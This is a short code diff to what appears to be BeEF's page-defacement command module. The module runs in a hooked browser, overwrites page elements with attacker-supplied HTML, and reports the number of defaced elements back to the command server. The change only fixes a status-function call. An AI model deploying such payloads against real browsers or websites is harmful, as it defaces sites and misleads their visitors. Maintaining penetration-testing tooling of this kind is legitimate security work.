@@ -10,5 +10,5 @@ beef.execute(function() {
 		$j(this).html(decodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@deface_content) %>')););
 	}).length;
 
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Defaced "+ result +" elements", beef.are.status_success());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Defaced "+ result +" elements", beef.status.success());
 });
